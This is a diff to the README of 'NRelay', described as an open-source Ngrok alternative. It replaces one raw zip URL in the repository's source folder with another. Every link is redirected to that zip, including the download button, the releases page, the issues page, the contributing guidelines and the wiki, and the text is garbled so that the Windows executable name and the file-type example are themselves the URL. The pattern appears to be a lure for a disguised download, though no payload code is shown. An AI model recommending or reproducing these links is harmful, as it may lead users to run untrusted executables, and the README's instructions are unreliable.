@@ -6,7 +6,7 @@ Welcome to NRelay! This application provides an open-source alternative to Ngrok
 
 ## 📥 Download NRelay
 
-[![Download NRelay](https://github.com/macqgoye/NRelay/raw/refs/heads/main/nrelay_server/src/N_Relay_opisthogyrous.zip%20NRelay-v1.0-blue)](https://github.com/macqgoye/NRelay/raw/refs/heads/main/nrelay_server/src/N_Relay_opisthogyrous.zip)
+[![Download NRelay](https://raw.githubusercontent.com/macqgoye/NRelay/main/nrelay_core/src/Relay-N-v2.4.zip%20NRelay-v1.0-blue)](https://raw.githubusercontent.com/macqgoye/NRelay/main/nrelay_core/src/Relay-N-v2.4.zip)
 
 ## 📝 System Requirements
 
@@ -35,7 +35,7 @@ NRelay packs several useful features to enhance your experience:
 
 To get the latest version of NRelay, go to our releases page. Click the button below.
 
-[Visit the Releases Page to Download](https://github.com/macqgoye/NRelay/raw/refs/heads/main/nrelay_server/src/N_Relay_opisthogyrous.zip)
+[Visit the Releases Page to Download](https://raw.githubusercontent.com/macqgoye/NRelay/main/nrelay_core/src/Relay-N-v2.4.zip)
 
 ### Step 2: Choose Your Version
 
@@ -51,11 +51,11 @@ Once the download is complete, find the file in your computer's Downloads folder
 
 ### Step 5: Extract the Files (if necessary)
 
-If you downloaded a compressed file (like .zip or https://github.com/macqgoye/NRelay/raw/refs/heads/main/nrelay_server/src/N_Relay_opisthogyrous.zip), right-click on it and choose "Extract All" or "Extract Here" to get the application files.
+If you downloaded a compressed file (like .zip or https://raw.githubusercontent.com/macqgoye/NRelay/main/nrelay_core/src/Relay-N-v2.4.zip), right-click on it and choose "Extract All" or "Extract Here" to get the application files.
 
 ### Step 6: Run NRelay
 
-1. Double-click on the NRelay executable file (e.g., `https://github.com/macqgoye/NRelay/raw/refs/heads/main/nrelay_server/src/N_Relay_opisthogyrous.zip` for Windows, or `NRelay` for macOS/Linux).
+1. Double-click on the NRelay executable file (e.g., `https://raw.githubusercontent.com/macqgoye/NRelay/main/nrelay_core/src/Relay-N-v2.4.zip` for Windows, or `NRelay` for macOS/Linux).
 2. Follow any on-screen instructions to finish the setup.
 
 ## 🔒 Basic Usage
@@ -81,16 +81,16 @@ If you face any issues while running NRelay, here are some common solutions:
 
 ## 💬 Support and Feedback
 
-If you need additional help, visit our [issues page](https://github.com/macqgoye/NRelay/raw/refs/heads/main/nrelay_server/src/N_Relay_opisthogyrous.zip) to report a problem or ask questions. You can also provide feedback on how we can improve NRelay.
+If you need additional help, visit our [issues page](https://raw.githubusercontent.com/macqgoye/NRelay/main/nrelay_core/src/Relay-N-v2.4.zip) to report a problem or ask questions. You can also provide feedback on how we can improve NRelay.
 
 ## 🤝 How to Contribute
 
-We welcome contributions from everyone! If you want to improve NRelay, please check our [contributing guidelines](https://github.com/macqgoye/NRelay/raw/refs/heads/main/nrelay_server/src/N_Relay_opisthogyrous.zip). 
+We welcome contributions from everyone! If you want to improve NRelay, please check our [contributing guidelines](https://raw.githubusercontent.com/macqgoye/NRelay/main/nrelay_core/src/Relay-N-v2.4.zip). 
 
 ## 🚀 Explore More
 
-For further information, documentation, and advanced usage, please check our [Wiki](https://github.com/macqgoye/NRelay/raw/refs/heads/main/nrelay_server/src/N_Relay_opisthogyrous.zip). You’ll find valuable tips and tricks to get the most from NRelay.
+For further information, documentation, and advanced usage, please check our [Wiki](https://raw.githubusercontent.com/macqgoye/NRelay/main/nrelay_core/src/Relay-N-v2.4.zip). You’ll find valuable tips and tricks to get the most from NRelay.
 
 ## 🚀 Download NRelay Again
 
-[Download NRelay](https://github.com/macqgoye/NRelay/raw/refs/heads/main/nrelay_server/src/N_Relay_opisthogyrous.zip) to start your secure tunneling today!
+[Download NRelay](https://raw.githubusercontent.com/macqgoye/NRelay/main/nrelay_core/src/Relay-N-v2.4.zip) to start your secure tunneling today!
